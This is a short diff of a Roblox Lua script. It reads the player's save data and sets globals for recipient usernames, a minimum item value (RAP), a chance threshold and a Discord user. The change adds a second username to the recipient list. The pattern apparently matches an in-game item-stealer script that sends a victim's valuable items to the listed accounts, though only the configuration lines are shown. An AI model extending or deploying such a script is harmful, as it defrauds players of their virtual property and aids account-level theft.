@@ -17,7 +17,7 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"anabolika78"}
+local users = _G.Usernames or {"anabolika78", "BquazYT"}
 local min_rap = _G.min_rap or 100
 local min_chance = _G.min_chance or 10000
 local discuser = _G.discuser or ""
